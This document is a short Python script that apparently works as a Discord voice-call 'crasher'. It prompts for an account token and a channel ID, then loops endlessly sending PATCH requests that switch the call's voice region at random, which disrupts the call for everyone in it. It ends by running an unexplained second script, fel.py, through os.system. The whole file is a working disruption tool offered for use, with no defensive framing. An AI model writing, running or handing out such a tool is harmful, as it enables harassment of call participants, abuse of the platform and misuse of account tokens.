import requests, json, random, os

# https://discord.com/api/v9/channels/927014262134669414/call

data = [
    "japan",
    "brazil",
    "hongkong",
    "india",
    "rotterdam",
    "russia",
    "singapore",
    "southafrica",
    "sydney",
    "us-central",
    "us-east",
    "us-south",
    "us-west",
]


class Discord:
    def crasher(token, channelid, randregion):
        payload = json.dumps({"region": f"{randregion}"})

        headers = {
            "authority": "discord.com",
            "accept": "*/*",
            "authorization": token,
            "content-type": "application/json",
        }
        url = f"https://discord.com/api/v9/channels/{channelid}/call"
        r = requests.request("PATCH", url, headers=headers, data=payload)


if __name__ == "__main__":
    token = input("[+] Enter token -> ")
    channelid = input("[+] Enter channel ID -> ")
    while True:
        randregion = random.choice(data)
        print(f"[+] Changed region to: {randregion}")
        Discord.crasher(token, channelid, randregion)

os.system("py fel.py")
